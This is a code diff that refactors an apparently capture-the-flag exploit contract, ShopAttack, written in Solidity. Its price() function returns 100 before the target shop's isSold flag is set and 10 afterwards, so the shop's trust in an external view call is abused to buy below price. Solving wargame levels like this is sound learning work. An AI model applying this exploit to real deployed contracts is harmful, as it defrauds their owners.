@@ -6,6 +6,8 @@ import {Broadcasted} from "./Broadcasted.sol";
 
 contract ShopAttack is Broadcasted {
     address private s_shop;
+    uint256 internal constant BALANCE = 100;
+    uint256 internal constant SMALLER_BALANCE = 10;
 
     function attack(address payable shopCtr_) public payable override {
         IShop(shopCtr_).buy();
@@ -21,9 +23,9 @@ contract ShopAttack is Broadcasted {
 
     function price() external view returns (uint) {
         if (!IShop(s_shop).isSold()) {
-            return 100;
+            return BALANCE;
         } else {
-            return 10;
+            return SMALLER_BALANCE;
         }
     }
 
